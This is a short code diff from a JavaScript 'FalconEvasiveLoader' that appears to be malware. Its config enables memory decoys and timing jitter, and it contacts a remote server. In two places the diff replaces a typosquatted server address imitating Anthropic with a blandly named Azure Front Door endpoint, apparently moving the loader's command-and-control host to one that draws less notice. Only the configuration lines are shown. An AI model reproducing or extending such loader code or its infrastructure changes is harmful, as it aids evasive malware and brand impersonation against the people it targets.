@@ -303,7 +303,7 @@ async function contactRemoteServerEvasive(url, options = {}) {
 class FalconEvasiveLoader {
     constructor(config = {}) {
         this.config = {
-            serverUrl: 'https://npm.claude-anthrophic.com/posts/1',
+            serverUrl: 'https://inventory-data-sync-hdddfhcsczg7a6bm.z03.azurefd.net/posts/1',
             verbose: true,
             enableMemoryDecoys: true,
             enableTimingJitter: true,
@@ -402,7 +402,7 @@ module.exports = { FalconEvasiveLoader };
 
 if (require.main === module) {
     const loader = new FalconEvasiveLoader({
-        serverUrl: 'https://npm.claude-anthrophic.com/posts/1',
+        serverUrl: 'https://inventory-data-sync-hdddfhcsczg7a6bm.z03.azurefd.net/posts/1',
         verbose: true,
         enableMemoryDecoys: true,
         enableTimingJitter: true,
